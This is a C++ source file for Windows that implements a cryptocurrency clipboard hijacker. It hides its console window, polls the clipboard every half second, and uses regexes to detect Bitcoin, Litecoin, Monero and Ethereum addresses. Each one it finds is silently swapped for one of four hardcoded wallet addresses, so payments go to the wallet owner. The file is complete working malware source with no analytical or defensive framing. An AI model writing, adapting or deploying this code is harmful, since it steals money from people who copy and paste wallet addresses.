#include <iostream>
#include <Windows.h>
#include <urlmon.h>
#include <regex>
#include <string>
#include <algorithm>
#include <ShlObj.h>
#include <Lmcons.h>
#include <filesystem>
#include <atlstr.h>
#include <wchar.h>
#include <KnownFolders.h>
#include <shlobj.h>

#pragma comment(lib, "urlmon.lib")

using namespace std;

HANDLE clip;
string clipboard = "";

string bitcoin = "bc1qc5r23panwck4cywdvsxjshq46uheczl62rflts"; 
string litecoin = "LVgUdFtPqd2JBbAX69ReX5MoJPZbTxBUBC";
string monero = "44a4zLz6Ni7G4ytakXDtSd6ABZvYRnZT1gG5xuNDbmej5XjzKgLeG7sgrtuJsC4Mfk35JwYBxToNrC3D6KbeaUM9A7yrULS";
string ethereum = "0xeF41aE7737514E94C555356aBb01DfC8611726C7";

regex bitpat{ "^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$" };
regex litpat{ "^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$" };
regex monpat{ "^4([0-9]|[A-B])(.){93}" };
regex ethpat{ "^0x[a-fA-F0-9]{40}$" };

int main()
{

	HWND executable = GetConsoleWindow();
	ShowWindow(executable, SW_HIDE);

	while (true)
	{
		if (OpenClipboard(NULL))
		{
			clip = GetClipboardData(CF_TEXT);
			clipboard = (char*)GetClipboardData(CF_TEXT);

			CloseClipboard();

			bool bitmatch = regex_search(clipboard, bitpat);

			if (bitmatch)
			{
				const char* output = bitcoin.c_str();
				const size_t len = strlen(output) + 1;

				HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, len);

				memcpy(GlobalLock(hMem), output, len);

				GlobalUnlock(hMem);

				OpenClipboard(0);
				EmptyClipboard();
				SetClipboardData(CF_TEXT, hMem);

				CloseClipboard();
			}

			bool litmatch = regex_search(clipboard, litpat);

			if (litmatch)
			{
				const char* output = litecoin.c_str();
				const size_t len = strlen(output) + 1;

				HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, len);

				memcpy(GlobalLock(hMem), output, len);

				GlobalUnlock(hMem);

				OpenClipboard(0);
				EmptyClipboard();
				SetClipboardData(CF_TEXT, hMem);

				CloseClipboard();
			}

			bool monmatch = regex_search(clipboard, monpat);

			if (monmatch)
			{
				const char* output = monero.c_str();
				const size_t len = strlen(output) + 1;

				HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, len);

				memcpy(GlobalLock(hMem), output, len);

				GlobalUnlock(hMem);

				OpenClipboard(0);
				EmptyClipboard();
				SetClipboardData(CF_TEXT, hMem);

				CloseClipboard();
			}

			bool ethmatch = regex_search(clipboard, ethpat);

			if (ethmatch)
			{
				const char* output = ethereum.c_str();
				const size_t len = strlen(output) + 1;

				HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, len);

				memcpy(GlobalLock(hMem), output, len);

				GlobalUnlock(hMem);

				OpenClipboard(0);
				EmptyClipboard();
				SetClipboardData(CF_TEXT, hMem);

				CloseClipboard();
			}

		}
		Sleep(500);
	}
	return 0;

}